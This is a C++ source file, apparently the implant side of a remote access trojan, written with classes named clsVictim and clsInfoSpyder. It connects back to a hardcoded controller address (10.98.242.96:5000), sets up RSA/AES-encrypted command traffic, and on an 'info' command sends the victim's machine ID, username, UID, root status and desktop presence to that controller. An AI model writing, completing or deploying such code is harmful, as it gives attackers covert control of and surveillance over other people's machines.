/*
Author: ISSAC

*/

#include <iostream>
#include <unistd.h>
#include <cstring>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <sstream>
#include <vector>
#include <tuple>

#include <arpa/inet.h>

///

#include "clsEDP.hpp"
#include "clsInfoSpyder.hpp"
#include "clsTools.hpp"
#include "clsVictim.hpp"

char* g_szIP = "10.98.242.96";
uint16_t g_nPort = 5000;

const int g_nREAD_LENGTH = 65535;

std::ostringstream g_oss;

void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vsMsg)
{
    if (vsMsg.size() == 0)
        return;

    if (vsMsg[0] == "info")
    {
        clsInfoSpyder spy;
        auto stInfo = spy.m_info;

        std::vector<std::string> vsInfo = {
            "info",
            stInfo.m_bHasDesktop ? "1" : "0",
            stInfo.m_szMachineID,
            stInfo.m_szUsername,
            std::to_string(stInfo.m_nUid),
            stInfo.m_bIsRoot ? "1" : "0"
        };

        victim.fnSendCommand(vsInfo);
    }
}

void fnHandler(int sktSrv)
{
    clsTools::fnLogInfo("Starting session...");

    int nRecv = 0;
    std::vector<unsigned char> vuStaticRecvBuf(g_nREAD_LENGTH);
    std::vector<unsigned char> vuDynamicRecvBuf;

    clsVictim victim(sktSrv);

    // initial handshake
    victim.fnSendCmdParam(0, 0);

    do
    {
        // Receive data
        std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
        nRecv = recv(sktSrv, vuStaticRecvBuf.data(), vuStaticRecvBuf.size(), 0);

        if (nRecv <= 0)
            break; // socket closed or error

        // Append to dynamic buffer
        vuDynamicRecvBuf.insert(
            vuDynamicRecvBuf.end(),
            vuStaticRecvBuf.begin(),
            vuStaticRecvBuf.begin() + nRecv);

        // --- Process complete packets ---
        while (true)
        {
            // not enough for header yet
            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE)
                break;

            auto [nCommand, nParam, nLength] = clsEDP::fnGetHeader(vuDynamicRecvBuf);

            // incomplete packet — wait for next recv
            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE + static_cast<size_t>(nLength))
                break;

            // construct EDP from full message
            clsEDP edp(vuDynamicRecvBuf);
            vuDynamicRecvBuf = edp.fnGetMoreData();  // consume one packet

            auto [cmd, param, len, vuMsg] = edp.fnGetMsg();

            // === handle packet ===
            if (cmd == 0)
            {
                if (param == 0)
                {
                    // reserved handshake / ping
                }
            }
            else if (cmd == 1)
            {
                if (param == 0)
                {
                    // --- handshake stage 2: receive RSA key ---
                    std::string szb64RSAKey(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
                    std::vector<unsigned char> vuRSAKey = clsEZData::fnb64Decode(szb64RSAKey);

                    // create crypto with RSA key
                    clsCrypto crypto(vuRSAKey);
                    victim.m_crypto = crypto;

                    // generate AES key+IV, encrypt, and send
                    auto [vuAESKey, vuAESIV] = victim.m_crypto.fnCreateAESKey();
                    std::vector<unsigned char> ucKey(vuAESKey.begin(), vuAESKey.end());
                    std::vector<unsigned char> ucIV(vuAESIV.begin(), vuAESIV.end());

                    std::ostringstream oss;
                    oss << clsEZData::fnb64Encode(ucKey) << "|" << clsEZData::fnb64Encode(ucIV);

                    std::string szMsg = oss.str();
                    std::string szCipherMsg = clsEZData::fnb64EncodeUtf8(victim.m_crypto.fnvuRSAEncrypt(szMsg));

                    victim.fnSend(1, 1, szCipherMsg);
                }
                else if (param == 2)
                {
                    std::string szChallenge(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
                    std::string szCipher = clsEZData::fnb64EncodeUtf8(victim.m_crypto.fnvuAESEncrypt(szChallenge));

                    victim.fnSend(1, 3, szCipher);
                }
            }
            else if (cmd == 2)
            {
                if (param == 0)
                {
                    std::vector<unsigned char> vuPlain = victim.m_crypto.fnvuAESDecrypt(vuMsg);
                    std::string szMsg(vuPlain.begin(), vuPlain.end());

                    auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
                    
                    fnRecvCommand(victim, decoded);
                }
            }
        }

    } while (nRecv > 0);

    clsTools::fnLogInfo("Session is terminated.");
}

int main(int argc, char *argv[])
{
    if (argc == 3)
    {
        g_szIP = argv[1];
        g_nPort = atoi(argv[2]);

        std::ostringstream oss;

        oss << "Input host: " << g_szIP << ":" << g_nPort;
        clsTools::fnLogInfo(oss.str());
        oss.clear();
    }

    int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in srvAddr {};
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(g_nPort);
    inet_pton(AF_INET, g_szIP, &srvAddr.sin_addr);

    if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
    {
        perror("connect");
        return 1;
    }
    else
    {
        fnHandler(sktSrv);
    }
}